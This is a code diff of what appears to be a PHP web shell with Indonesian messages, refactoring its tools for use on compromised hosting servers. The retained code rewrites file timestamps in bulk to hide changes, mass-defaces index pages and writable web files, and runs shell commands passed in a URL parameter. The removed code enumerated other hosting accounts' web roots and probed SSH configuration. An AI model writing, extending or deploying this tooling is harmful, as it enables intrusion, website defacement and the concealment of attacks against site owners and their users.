@@ -886,24 +882,20 @@ function changeTimestamp($path, $timestamp, $type = 'both') {
         if ($type == 'both' || $type == 'atime') {
             if (@touch($full_path, filemtime($full_path), $timestamp)) {
                 $results[] = "✅ Access time updated: " . date('Y-m-d H:i:s', $timestamp);
+                $success = true;
             } else {
                 $results[] = "❌ Failed to update access time";
             }
         }
-        
-        if (empty($results) || strpos(implode(' ', $results), '✅') !== false) {
-            logActivityMulti("TIMESTEP: " . $full_path . " → " . date('Y-m-d H:i:s', $timestamp), dirname($full_path));
-            return array(
-                'status' => true,
-                'message' => "✅ Timestamp updated!\n" . implode("\n", $results),
-                'path' => $full_path,
-                'timestamp' => $timestamp
-            );
-        } else {
-            return array('status' => false, 'message' => implode("\n", $results));
-        }
-    } catch(Exception $e) {
+    } catch (Exception $e) {
         return array('status' => false, 'message' => "❌ Error: " . $e->getMessage());
+    }
+    
+    if ($success) {
+        logActivity("TIMESTEP: " . $full_path . " → " . date('Y-m-d H:i:s', $timestamp));
+        return array('status' => true, 'message' => "✅ Timestamp updated!\n" . implode("\n", $results));
+    } else {
+        return array('status' => false, 'message' => implode("\n", $results));
     }
 }
 
@@ -917,39 +909,42 @@ function massChangeTimestamp($dir, $timestamp, $pattern = '*', $type = 'both') {
     $success = 0;
     $errors = [];
     
-    $iterator = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS)
-    );
-    $iterator->setMaxDepth(15);
-    
-    foreach ($iterator as $item) {
-        $filename = $item->getFilename();
-        $path = $item->getPathname();
+    try {
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS)
+        );
         
-        $match = false;
-        if ($pattern == '*') {
-            $match = true;
-        } elseif (strpos($pattern, '*') !== false) {
-            $pattern_regex = '/^' . str_replace('*', '.*', preg_quote($pattern, '/')) . '$/i';
-            if (preg_match($pattern_regex, $filename)) $match = true;
-        } elseif (strpos($pattern, ',') !== false) {
-            $exts = array_map('trim', explode(',', $pattern));
-            $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-            if (in_array($ext, $exts)) $match = true;
-        } else {
-            $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-            if ($ext == $pattern) $match = true;
-        }
-        
-        if ($match) {
-            $total++;
-            $result = changeTimestamp($path, $timestamp, $type);
-            if ($result['status']) {
-                $success++;
+        foreach ($iterator as $item) {
+            $filename = $item->getFilename();
+            $path = $item->getPathname();
+            
+            $match = false;
+            if ($pattern == '*') {
+                $match = true;
+            } elseif (strpos($pattern, '*') !== false) {
+                $pattern_regex = '/^' . str_replace('*', '.*', preg_quote($pattern, '/')) . '$/i';
+                if (preg_match($pattern_regex, $filename)) $match = true;
+            } elseif (strpos($pattern, ',') !== false) {
+                $exts = array_map('trim', explode(',', $pattern));
+                $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+                if (in_array($ext, $exts)) $match = true;
             } else {
-                $errors[] = $result['message'];
+                $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+                if ($ext == $pattern) $match = true;
+            }
+            
+            if ($match) {
+                $total++;
+                $result = changeTimestamp($path, $timestamp, $type);
+                if ($result['status']) {
+                    $success++;
+                } else {
+                    $errors[] = $result['message'];
+                }
             }
         }
+    } catch (Exception $e) {
+        $errors[] = "Error: " . $e->getMessage();
     }
     
     return [
@@ -957,7 +952,7 @@ function massChangeTimestamp($dir, $timestamp, $pattern = '*', $type = 'both') {
         'total' => $total,
         'success' => $success,
         'errors' => $errors,
-        'message' => "✅ Mass Timestamp selesai!\n   📄 Total: " . $total . " file/folder\n   ✅ Berhasil: " . $success . "\n" . (count($errors) > 0 ? "   ❌ Error: " . count($errors) : "")
+        'message' => "✅ Mass Timestamp selesai!\n   📄 Total: " . $total . " file/folder\n   ✅ Berhasil: " . $success
     ];
 }
 
@@ -974,386 +969,114 @@ function getTimestampOptions() {
     return $options;
 }
 
-// ===================== MULTI-DOMAIN LOG FUNCTIONS ======================
-
-function findAllDomains() {
-    $domains = [];
-    
-    $home_dirs = glob('/home/*/public_html', GLOB_ONLYDIR);
-    foreach ($home_dirs as $dir) {
-        $user = basename(dirname($dir));
-        $domains[] = ['path' => $dir, 'user' => $user, 'domain' => $user . ' (Home)'];
-    }
-    
-    $www_dirs = glob('/var/www/*', GLOB_ONLYDIR);
-    foreach ($www_dirs as $dir) {
-        if (is_dir($dir) && (file_exists($dir . '/index.php') || file_exists($dir . '/index.html'))) {
-            $name = basename($dir);
-            $domains[] = ['path' => $dir, 'user' => 'www-data', 'domain' => $name . ' (www)'];
-        }
-    }
-    
-    $vhosts = glob('/var/www/vhosts/*', GLOB_ONLYDIR);
-    foreach ($vhosts as $dir) {
-        if (is_dir($dir)) {
-            $domain = basename($dir);
-            $domains[] = ['path' => $dir, 'user' => 'vhost', 'domain' => $domain . ' (Plesk)'];
-        }
-    }
-    
-    $current = __DIR__;
-    $domains[] = ['path' => $current, 'user' => 'current', 'domain' => 'Current (' . basename($current) . ')'];
-    
-    $doc_root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : __DIR__;
-    $server_name = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost';
-    $domains[] = ['path' => $doc_root, 'user' => 'server', 'domain' => $server_name . ' (DocumentRoot)'];
-    
-    return $domains;
-}
-
-function readDomainLog($log_path, $lines = 100, $filter = '') {
-    $log_file = rtrim($log_path, '/') . '/' . $GLOBALS['config']['log_file'];
-    
-    if (!file_exists($log_file)) return "❌ Log file not found: " . $log_file;
-    if (!is_readable($log_file)) return "❌ Log file not readable: " . $log_file;
-    
-    $output = [];
-    $output[] = "📋 ACTIVITY LOG: " . $log_file;
-    $output[] = "================================================";
-    $output[] = "";
-    
-    $content = kjEx("tail -" . intval($lines) . " '" . addslashes($log_file) . "' 2>&1");
-    
-    if (empty($content)) {
-        $output[] = "⚠️ Log file is empty";
-        return implode("\n", $output);
-    }
-    
-    if (!empty($filter)) {
-        $lines_arr = explode("\n", $content);
-        $filtered = [];
-        foreach ($lines_arr as $line) {
-            if (stripos($line, $filter) !== false) $filtered[] = $line;
-        }
-        $content = implode("\n", $filtered);
-        if (empty($content)) {
-            $output[] = "⚠️ No entries found with filter: " . $filter;
-            return implode("\n", $output);
-        }
-        $output[] = "🔍 Filter: " . $filter . " (" . count($filtered) . " entries)";
-        $output[] = "";
-    }
-    
-    $output[] = $content;
-    return implode("\n", $output);
-}
-
-function aggregateLogs($lines = 50) {
-    $domains = findAllDomains();
-    $all_logs = [];
-    
-    foreach ($domains as $domain) {
-        $log_file = rtrim($domain['path'], '/') . '/' . $GLOBALS['config']['log_file'];
-        if (file_exists($log_file) && is_readable($log_file)) {
-            $content = kjEx("tail -" . intval($lines) . " '" . addslashes($log_file) . "' 2>&1");
-            if (!empty($content)) {
-                foreach (explode("\n", $content) as $line) {
-                    if (!empty(trim($line))) {
-                        $all_logs[] = ['domain' => $domain['domain'], 'path' => $domain['path'], 'line' => $line];
-                    }
-                }
-            }
-        }
-    }
-    
-    usort($all_logs, function($a, $b) {
-        preg_match('/\[(.*?)\]/', $a['line'], $match_a);
-        preg_match('/\[(.*?)\]/', $b['line'], $match_b);
-        if (isset($match_a[1]) && isset($match_b[1])) {
-            return strtotime($match_b[1]) - strtotime($match_a[1]);
-        }
-        return 0;
-    });
-    
-    return $all_logs;
-}
-
-function monitorFileChanges($minutes = 10) {
-    $domains = findAllDomains();
-    $changes = [];
-    $since= time() - ($minutes * 60);
-    
-    foreach ($domains as $domain) {
-        $path = $domain['path'];
-        if (!is_dir($path)) continue;
-        
-        $iterator = new RecursiveIteratorIterator(
-            new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
-            RecursiveIteratorIterator::SELF_FIRST
-        );
-        $iterator->setMaxDepth(10);
-        
-        foreach ($iterator as $file) {
-            if ($file->isFile()) {
-                $mtime = $file->getMTime();
-                if ($mtime >= $since) {
-                    $changes[] = [
-                        'domain' => $domain['domain'],
-                        'path' => $file->getPathname(),
-                        'name' => $file->getFilename(),
-                        'size' => $file->getSize(),
-                        'modified' => date('Y-m-d H:i:s', $mtime),
-                        'type' => 'modified'
-                    ];
-                }
-            }
-        }
-    }
-    
-    return $changes;
-}
-
-function logActivityMulti($message, $domain_path = null) {
-    global $config;
-    if (!$config['log_activity']) return;
-    
-    if (empty($domain_path)) $domain_path = __DIR__;
-    
-    $log_file = rtrim($domain_path, '/') . '/' . $config['log_file'];
-    $log_entry = '[' . date('Y-m-d H:i:s') . '] ' . 
-                 'IP: ' . $_SERVER['REMOTE_ADDR'] . ' | ' . 
-                 'User: ' . $config['username'] . ' | ' . 
-                 $message . "\n";
-    @file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
-}
-
 // ===================== EXTRACT FUNCTIONS ======================
-
 function extract_file($file_path, $extract_to = '') {
-    if(empty($extract_to)) {
+    if (empty($extract_to)) {
         $extract_to = dirname($file_path) . '/' . pathinfo($file_path, PATHINFO_FILENAME);
     }
-    if(!is_dir($extract_to)) @mkdir($extract_to, 0777, true);
+    if (!is_dir($extract_to)) {
+        @mkdir($extract_to, 0777, true);
+    }
     
-    $mime_type = _get_mime_type($file_path);
     $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
-    if(strpos(basename($file_path), '.tar.gz') !== false) $mime_type = 'application/x-tar+gz';
     
-    $result = array('status' => false, 'message' => '');
-    
-    switch($mime_type) {
-        case 'zip':
-        case 'application/zip':
-            $result = _extract_zip($file_path, $extract_to);
-            break;
-        case 'tar':
-        case 'application/x-tar':
-            $result = _extract_tar($file_path, $extract_to);
-            break;
-        case 'gz':
-        case 'gzip':
-        case 'application/x-gzip':
-            if(strpos(basename($file_path), '.tar.gz') !== false) {
-                $result = _extract_targz($file_path, $extract_to);
-            } else {
-                $result = _extract_gz($file_path, $extract_to);
+    // Try command first
+    if (_kj_can_runCommand()) {
+        if ($ext == 'zip') {
+            $cmd = "unzip -o '" . addslashes($file_path) . "' -d '" . addslashes($extract_to) . "' 2>&1";
+            kjEx($cmd);
+            if (is_dir($extract_to) && count(scandir($extract_to)) > 2) {
+                return array('status' => true, 'message' => "✅ Success! Extracted to: " . $extract_to);
             }
-            break;
-        case 'application/x-tar+gz':
-        case 'tgz':
-            $result = _extract_targz($file_path, $extract_to);
-            break;
-        case 'rar':
-        case 'application/x-rar':
-            $result = _extract_rar($file_path, $extract_to);
-            break;
-        default:
-            if($ext == 'zip') $result = _extract_zip($file_path, $extract_to);
-            elseif($ext == 'tar') $result = _extract_tar($file_path, $extract_to);
-            elseif($ext == 'gz') $result = _extract_gz($file_path, $extract_to);
-            elseif($ext == 'rar') $result = _extract_rar($file_path, $extract_to);
-            else $result['message'] = "Unsupported file type: " . $mime_type;
-    }
-    return $result;
-}
-
-function _extract_zip($file, $target) {
-    if(_kj_can_runCommand()) {
-        $cmd = "unzip -o '" . addslashes($file) . "' -d '" . addslashes($target) . "' 2>&1";
-        kjEx($cmd);
-        if(is_dir($target) && count(scandir($target)) > 2) {
-            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
+        } elseif ($ext == 'tar' || $ext == 'gz' || $ext == 'tgz') {
+            $cmd = "tar -xzf '" . addslashes($file_path) . "' -C '" . addslashes($extract_to) . "' 2>&1";
+            kjEx($cmd);
+            if (is_dir($extract_to) && count(scandir($extract_to)) > 2) {
+                return array('status' => true, 'message' => "✅ Success! Extracted to: " . $extract_to);
+            }
         }
     }
-    if(class_exists('ZipArchive')) {
+    
+    // Try PHP ZipArchive
+    if ($ext == 'zip' && class_exists('ZipArchive')) {
         $zip = new ZipArchive();
-        if($zip->open($file) === true) {
-            $zip->extractTo($target);
+        if ($zip->open($file_path) === true) {
+            $zip->extractTo($extract_to);
             $zip->close();
-            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
+            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $extract_to);
         }
     }
-    return array('status' => false, 'message' => "❌ Failed to extract ZIP file");
-}
-
-function _extract_tar($file, $target) {
-    if(_kj_can_runCommand()) {
-        $cmd = "tar -xf '" . addslashes($file) . "' -C '" . addslashes($target) . "' 2>&1";
-        kjEx($cmd);
-        if(is_dir($target) && count(scandir($target)) > 2) {
-            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
-        }
-    }
-    if(class_exists('PharData')) {
+    
+    // Try PharData for tar/gz
+    if (($ext == 'tar' || $ext == 'gz' || $ext == 'tgz') && class_exists('PharData')) {
         try {
-            $phar = new PharData($file);
-            $phar->extractTo($target);
-            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
-        } catch(Exception $e) {}
+            $phar = new PharData($file_path);
+            $phar->extractTo($extract_to);
+            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $extract_to);
+        } catch (Exception $e) {}
     }
-    return array('status' => false, 'message' => "❌ Failed to extract TAR file");
-}
-
-function _extract_gz($file, $target) {
-    if(_kj_can_runCommand()) {
-        $output_file = $target . '/' . str_replace('.gz', '', basename($file));
-        $cmd = "gunzip -c '" . addslashes($file) . "' > '" . addslashes($output_file) . "'";
-        kjEx($cmd);
-        if(file_exists($output_file)) {
-            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $output_file);
-        }
-    }
-    if(function_exists('gzdecode')) {
-        $content = file_get_contents($file);
-        $decoded = gzdecode($content);
-        if($decoded !== false) {
-            $output_file = $target . '/' . str_replace('.gz', '', basename($file));
-            file_put_contents($output_file, $decoded);
-            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $output_file);
-        }
-    }
-    return array('status' => false, 'message' => "❌ Failed to extract GZ file");
-}
-
-function _extract_targz($file, $target) {
-    if(_kj_can_runCommand()) {
-        $cmd = "tar -xzf '" . addslashes($file) . "' -C '" . addslashes($target) . "' 2>&1";
-        kjEx($cmd);
-        if(is_dir($target) && count(scandir($target)) > 2) {
-            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
-        }
-    }
-    if(class_exists('PharData')) {
-        try {
-            if(strpos(basename($file), '.tar.gz') !== false) {
-                $new_file = $target . '/' . basename($file);
-                @copy($file, $new_file);
-                $new_tar = str_replace('.tar.gz', '.tar', $new_file);
-                $p = new PharData($new_file);
-                $p->decompress();
-                $phar = new PharData($new_tar);
-                $phar->extractTo($target);
-                @unlink($new_file);
-                @unlink($new_tar);
-            } else {
-                $phar = new PharData($file);
-                $phar->extractTo($target);
-            }
-            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
-        } catch(Exception $e) {}
-    }
-    return array('status' => false, 'message' => "❌ Failed to extract TAR.GZ file");
-}
-
-function _extract_rar($file, $target) {
-    if(_kj_can_runCommand() && kjWhich('unrar')) {
-        $cmd = "unrar x -o+ '" . addslashes($file) . "' '" . addslashes($target) . "'";
-        kjEx($cmd);
-        if(is_dir($target) && count(scandir($target)) > 2) {
-            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
-        }
-    }
-    if(class_exists('RarArchive')) {
-        $rar = RarArchive::open($file);
-        if($rar) {
-            $entries = $rar->getEntries();
-            foreach($entries as $entry) $entry->extract($target);
-            $rar->close();
-            return array('status' => true, 'message' => "✅ Success! Extracted to: " . $target);
-        }
-    }
-    return array('status' => false, 'message' => "❌ Failed to extract RAR file");
-}
-
-function _get_mime_type($file) {
-    if(function_exists('finfo_open')) {
-        $finfo = finfo_open(FILEINFO_MIME_TYPE);
-        $mime = finfo_file($finfo, $file);
-        finfo_close($finfo);
-        return $mime;
-    }
-    if(function_exists('mime_content_type')) return mime_content_type($file);
-    if(_kj_can_runCommand()) {
-        $mime = kjEx("file -b --mime-type '" . addslashes($file) . "'");
-        if(!empty($mime)) return trim($mime);
-    }
-    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-    $mime_types = [
-        'zip' => 'application/zip', 'rar' => 'application/x-rar',
-        'tar' => 'application/x-tar', 'gz' => 'application/x-gzip',
-        'tgz' => 'application/x-tar+gz', '7z' => 'application/x-7z-compressed'
-    ];
-    return isset($mime_types[$ext]) ? $mime_types[$ext] : 'unknown';
+    
+    return array('status' => false, 'message' => "❌ Failed to extract. Format tidak didukung.");
 }
 
 function zip_file($source, $destination) {
-    if(_kj_can_runCommand()) {
-        if($GLOBALS['sys'] == 'win') {
-            $cmd = "powershell Compress-Archive -Path '" . addslashes($source) . "' -DestinationPath '" . addslashes($destination) . "'";
-        } else {
-            $cmd = "zip -r '" . addslashes($destination) . "' '" . addslashes($source) . "'";
-        }
+    if (_kj_can_runCommand()) {
+        $cmd = "zip -r '" . addslashes($destination) . "' '" . addslashes($source) . "' 2>&1";
         kjEx($cmd);
-        if(file_exists($destination)) {
+        if (file_exists($destination)) {
             return array('status' => true, 'message' => "✅ Success! Created: " . $destination);
         }
     }
-    if(class_exists('ZipArchive')) {
-        if(_zip_with_php($source, $destination)) {
-            return array('status' => true, 'message' => "✅ Success! Created: " . $destination);
-        }
+    
+    if (!class_exists('ZipArchive')) {
+        return array('status' => false, 'message' => "❌ ZipArchive tidak tersedia!");
     }
-    return array('status' => false, 'message' => "❌ Failed to create ZIP file");
-}
-
-function _zip_with_php($source, $destination) {
-    if(!extension_loaded('zip') || !file_exists($source)) return false;
+    
     $zip = new ZipArchive();
-    if(!$zip->open($destination, ZIPARCHIVE::CREATE)) return false;
-    $source = str_replace('\\', '/', realpath($source));
-    if(is_dir($source) === true) {
-        $files = new RecursiveIteratorIterator(
-            new RecursiveDirectoryIterator($source),
-            RecursiveIteratorIterator::SELF_FIRST
-        );
-        foreach($files as $file) {
-            $file = str_replace('\\', '/', $file);
-            if(in_array(substr($file, strrpos($file, '/') + 1), array('.', '..'))) continue;
-            $file = realpath($file);
-            if(is_dir($file) === true) {
-                $zip->addEmptyDir(str_replace($source.'/', '', $file.'/'));
-            } else if(is_file($file) === true) {
-                $zip->addFromString(str_replace($source.'/', '', $file), file_get_contents($file));
+    if (!$zip->open($destination, ZipArchive::CREATE)) {
+        return array('status' => false, 'message' => "❌ Failed to create ZIP file");
+    }
+    
+    $source = realpath($source);
+    if (!$source) {
+        return array('status' => false, 'message' => "❌ Source tidak ditemukan");
+    }
+    
+    if (is_dir($source)) {
+        try {
+            $files = new RecursiveIteratorIterator(
+                new RecursiveDirectoryIterator($source),
+                RecursiveIteratorIterator::SELF_FIRST
+            );
+            foreach ($files as $file) {
+                $file = str_replace('\\', '/', $file);
+                if (in_array(substr($file, strrpos($file, '/') + 1), array('.', '..'))) continue;
+                $file = realpath($file);
+                if (is_dir($file)) {
+                    $zip->addEmptyDir(str_replace($source.'/', '', $file.'/'));
+                } else if (is_file($file)) {
+                    $zip->addFromString(str_replace($source.'/', '', $file), file_get_contents($file));
+                }
             }
+        } catch (Exception $e) {
+            return array('status' => false, 'message' => "❌ Error: " . $e->getMessage());
         }
-    } else if(is_file($source) === true) {
+    } else if (is_file($source)) {
         $zip->addFromString(basename($source), file_get_contents($source));
     }
-    return $zip->close();
+    
+    $zip->close();
+    
+    if (file_exists($destination)) {
+        return array('status' => true, 'message' => "✅ Success! Created: " . $destination);
+    }
+    
+    return array('status' => false, 'message' => "❌ Failed to create ZIP");
 }
 
+// ===================== MASS DEFACE ======================
 function mass_deface($dir, $filename, $content, $method = 'all') {
-    if(!is_dir($dir) || !is_readable($dir)) {
+    if (!is_dir($dir) || !is_readable($dir)) {
         return array('status' => false, 'message' => "❌ Directory not readable");
     }
     $result = array('status' => true, 'files' => 0, 'message' => '');
@@ -1363,252 +1086,46 @@ function mass_deface($dir, $filename, $content, $method = 'all') {
 }
 
 function _mass_deface_recursive($dir, $filename, $content, $method, &$result) {
-    if(!is_dir($dir)) return;
-    $items = scandir($dir);
-    foreach($items as $item) {
-        if($item == '.' || $item == '..') continue;
-        $path = $dir . '/' . $item;
-        if(is_dir($path)) {
-            _mass_deface_recursive($path, $filename, $content, $method, $result);
-        } elseif(is_file($path) && is_writable($path)) {
-            $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
-            if($method == 'all') {
-                file_put_contents($path, $content);
-                $result['files']++;
-            } elseif($method == 'index') {
-                $index_files = array('index.php', 'index.htm', 'index.html', 'default.asp', 'default.aspx', 'index.asp', 'index.aspx');
-                if(in_array(basename($path), $index_files)) {
+    if (!is_dir($dir)) return;
+    try {
+        $items = scandir($dir);
+        foreach ($items as $item) {
+            if ($item == '.' || $item == '..') continue;
+            $path = $dir . '/' . $item;
+            if (is_dir($path)) {
+                _mass_deface_recursive($path, $filename, $content, $method, $result);
+            } elseif (is_file($path) && is_writable($path)) {
+                $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
+                if ($method == 'all') {
                     file_put_contents($path, $content);
                     $result['files']++;
-                }
-            } elseif($method == 'ext') {
-                $extensions = array('php', 'html', 'htm', 'asp', 'aspx', 'js');
-                if(in_array($ext, $extensions)) {
-                    file_put_contents($path, $content);
-                    $result['files']++;
-                }
-            } else {
-                if(basename($path) == $filename) {
-                    file_put_contents($path, $content);
-                    $result['files']++;
+                } elseif ($method == 'index') {
+                    $index_files = array('index.php', 'index.htm', 'index.html', 'default.asp', 'default.aspx', 'index.asp', 'index.aspx');
+                    if (in_array(basename($path), $index_files)) {
+                        file_put_contents($path, $content);
+                        $result['files']++;
+                    }
+                } elseif ($method == 'ext') {
+                    $extensions = array('php', 'html', 'htm', 'asp', 'aspx', 'js');
+                    if (in_array($ext, $extensions)) {
+                        file_put_contents($path, $content);
+                        $result['files']++;
+                    }
+                } else {
+                    if (basename($path) == $filename) {
+                        file_put_contents($path, $content);
+                        $result['files']++;
+                    }
                 }
             }
         }
-    }
-}
-
-// ===================== SSH DETECTOR ======================
-
-function sshDetector() {
-    $output = [];
-    $output[] = "🔍 SSH DETECTOR (Auto Detect)";
-    $output[] = "==============================";
-    $output[] = "";
-    
-    $ssh_proc = kjEx("ps aux | grep [s]shd | grep -v grep");
-    if (!empty($ssh_proc)) {
-        $output[] = "  ✅ SSH Process Running:";
-        foreach (explode("\n", $ssh_proc) as $line) {
-            if (!empty($line)) $output[] = "  " . $line;
-        }
-    } else {
-        $output[] = "  ❌ No SSH process found!";
-    }
-    $output[] = "";
-    
-    $output[] = "📡 2. Detecting SSH Port:";
-    $netstat = kjEx("netstat -tulpn 2>/dev/null | grep sshd | grep LISTEN | head -1 | awk '{print \$4}' | cut -d: -f2");
-    if (!empty($netstat)) {
-        $output[] = "  ✅ SSH Port: " . trim($netstat);
-    } else {
-        $ss = kjEx("ss -tulpn 2>/dev/null | grep sshd | grep LISTEN | head -1 | awk '{print \$4}' | cut -d: -f2");
-        if (!empty($ss)) {
-            $output[] = "  ✅ SSH Port: " . trim($ss);
-        } else {
-            $output[] = "  ⚠️ Could not detect SSH port (using default: 22)";
-        }
-    }
-    $output[] = "";
-    
-    $output[] = "⚙️ 3. SSH Service Status:";
-    $status = kjEx("systemctl is-active sshd 2>/dev/null");
-    if ($status == "active") {
-        $output[] = "  ✅ SSH Service: ACTIVE";
-    } elseif ($status == "inactive") {
-        $output[] = "  ❌ SSH Service: INACTIVE";
-    } else {
-        $status2 = kjEx("service sshd status 2>/dev/null | grep -E 'running|active|start'");
-        if (!empty($status2)) {
-            $output[] = "  ✅ " . trim($status2);
-        } else {
-            $output[] = "  ⚠️ Service status unknown";
-        }
-    }
-    $output[] = "";
-    
-    $output[] = "📦 4. SSH Version:";
-    $version = kjEx("sshd -V 2>&1 | head -1");
-    if (!empty($version)) {
-        $output[] = "  " . trim($version);
-    }
-    $output[] = "";
-    
-    $output[] = "📋 SUMMARY";
-    $output[] = "================";
-    $output[] = "✅ SSH is " . (!empty($ssh_proc) ? "RUNNING" : "NOT RUNNING");
-    $port = trim($netstat) ?: "22";
-    $output[] = "✅ SSH Port: " . $port;
-    $output[] = "";$output[] = "🔑 To Connect: ssh -p " . $port . " username@" . $_SERVER['HTTP_HOST'];
-    
-    return implode("\n", $output);
-}
-
-function readSSHConfig($config_path = null) {
-    $output = [];
-    $output[] = "📄 SSH CONFIG READER";
-    $output[] = "====================";
-    $output[] = "";
-    
-    if (empty($config_path)) {
-        $find = kjEx("find / -name 'sshd_config' 2>/dev/null | head -5");
-        if (empty($find)) {
-            $output[] = "❌ No sshd_config found!";
-            $output[] = "💡 Using default SSH port: 22";
-            return implode("\n", $output);
-        }
-        $config_path = trim(explode("\n", $find)[0]);
-        $output[] = "🔍 Found config at: " . $config_path;
-        $output[] = "";
-    }
-    
-    if (!file_exists($config_path)) {
-        $output[] = "❌ Config file not found: " . $config_path;
-        return implode("\n", $output);
-    }
-    
-    $output[] = "📋 IMPORTANT CONFIGURATIONS:";
-    $output[] = "---------------------------";
-    
-    $important_keys = [
-        'Port' => 'SSH Port',
-        'PermitRootLogin' => 'Root Login',
-        'PasswordAuthentication' => 'Password Auth',
-        'PubkeyAuthentication' => 'Public Key Auth',
-        'AllowUsers' => 'Allowed Users',
-        'MaxAuthTries' => 'Max Auth Tries'
-    ];
-    
-    $port = "22";
-    foreach ($important_keys as $key => $label) {
-        $value = kjEx("grep -E '^" . $key . "\\s+' " . $config_path . " 2>/dev/null | head -1 | awk '{print \$2}'");
-        if (!empty($value)) {
-            if ($key== 'Port') $port = trim($value);
-            $output[] = "  ✅ " . $label . ": " . trim($value);
-        }
-    }
-    $output[] = "";
-    
-    $output[] = "📋 SUMMARY";
-    $output[] = "==========";
-    $output[] = "✅ Config file: " . $config_path;
-    $output[] = "✅ SSH Port: " . $port;
-    $output[] = "";
-    $output[] = "🔑 To connect: ssh -p " . $port . " username@" . $_SERVER['HTTP_HOST'];
-    
-    return implode("\n", $output);
-}
-
-function quickSSHPort() {
-    $output = [];
-    $output[] = "🎯 QUICK SSH PORT";
-    $output[] = "================";
-    $output[] = "";
-    
-    $methods = [
-        'netstat' => "netstat -tulpn 2>/dev/null | grep sshd | grep LISTEN | head -1 | awk '{print \$4}' | cut -d: -f2",
-        'ss' => "ss -tulpn 2>/dev/null | grep sshd | grep LISTEN | head -1 | awk '{print \$4}' | cut -d: -f2",
-        'lsof' => "lsof -i -P -n 2>/dev/null | grep sshd | grep LISTEN | head -1 | awk '{print \$9}' | cut -d: -f2"
-    ];
-    
-    $port = null;
-    foreach ($methods as $name => $cmd) {
-        $result = kjEx($cmd);
-        if (!empty($result) && is_numeric(trim($result))) {
-            $port = trim($result);
-            $output[] = "✅ SSH Port: " . $port . " (from " . $name . ")";
-            break;
-        }
-    }
-    
-    if (empty($port)) {
-        $output[] = "⚠️ Could not detect SSH port";
-        $port = "22";
-        $output[] = "📝 Using default port: 22";
-    }
-    
-    $output[] = "";
-    $output[] = "🔑 SSH Connection:";
-    $output[] = "  ssh -p " . $port . " username@" . $_SERVER['HTTP_HOST'];
-    
-    return implode("\n", $output);
-}
-
-// ===================== UTILITY FUNCTIONS ======================
-
-function formatSize($bytes) {
-    if ($bytes == 0) return '0 B';
-    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
-    $i = floor(log($bytes, 1024));
-    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
-}
-
-function deleteItem($path) {
-    $full_path = realpath($path);
-    if ($full_path == __DIR__) return false;
-    if (!file_exists($full_path)) return false;
-    if (is_dir($full_path)) {
-        $files = array_diff(scandir($full_path), ['.', '..']);
-        foreach ($files as $file) deleteItem($full_path . '/' . $file);
-        return rmdir($full_path);
-    } else {
-        return unlink($full_path);
-    }
-}
-
-function getDirectoryContent($path) {
-    $items = [];
-    $full_path = realpath($path);
-    if (!is_dir($full_path)) return false;
-    $files = scandir($full_path);
-    foreach ($files as $file) {
-        if ($file == '.' || $file == '..') continue;
-        $file_path = $full_path . '/' . $file;
-        $is_dir = is_dir($file_path);
-        $permissions = substr(sprintf('%o', fileperms($file_path)), -4);
-        $is_root = ($permissions == '777' || $permissions == '666');
-        
-        $items[] = [
-            'name' => $file,
-            'path' => $file_path,
-            'is_dir' => $is_dir,
-            'is_root' => $is_root,
-            'size' => is_file($file_path) ? filesize($file_path) : 0,
-            'modified' => filemtime($file_path),
-            'permissions' => $permissions
-        ];
-    }
-    usort($items, function($a, $b) {
-        if ($a['is_dir'] == $b['is_dir']) return strcasecmp($a['name'], $b['name']);
-        return $a['is_dir'] ? -1 : 1;
-    });
-    return $items;
+    } catch (Exception $e) {}
 }
 
 // ===================== MAIN APPLICATION ======================
 
 requireLogin();
 
-// Get current path
 $current_path = isset($_GET['path']) ? $_GET['path'] : __DIR__;
 $current_path = realpath($current_path);
 if (!$current_path || !is_dir($current_path)) $current_path = __DIR__;
@@ -1618,70 +1135,12 @@ if (isset($_GET['ajax'])) {
     $action = $_GET['ajax'];
     
     if ($action == 'command' && isset($_GET['cmd'])) {
-        $cmd = $_GET['cmd'];
-        $output = kjEx($cmd, true);
-        echo $output;
-        exit;
-    }
-    
-    if ($action == 'ssh_detect') {
-        echo nl2br(sshDetector());
-        exit;
-    }
-    
-    if ($action == 'ssh_config') {
-        echo nl2br(readSSHConfig());
-        exit;
-    }
-    
-    if ($action == 'ssh_port') {
-        echo nl2br(quickSSHPort());
-        exit;
-    }
-    
-    if ($action == 'log_view' && isset($_GET['path'])) {
-        $log_path = $_GET['path'];
-        $lines = isset($_GET['lines']) ? intval($_GET['lines']) : 100;
-        $filter = isset($_GET['filter']) ? $_GET['filter'] : '';
-        echo nl2br(readDomainLog($log_path, $lines, $filter));
-        exit;
-    }
-    
-    if ($action == 'log_aggregate') {
-        $lines = isset($_GET['lines']) ? intval($_GET['lines']) : 50;
-        $logs = aggregateLogs($lines);
-        $output = [];
-        $output[] = "📋 AGGREGATED LOGS (All Domains)";
-        $output[] = "===================================";
-        $output[] = "Total entries: " . count($logs);
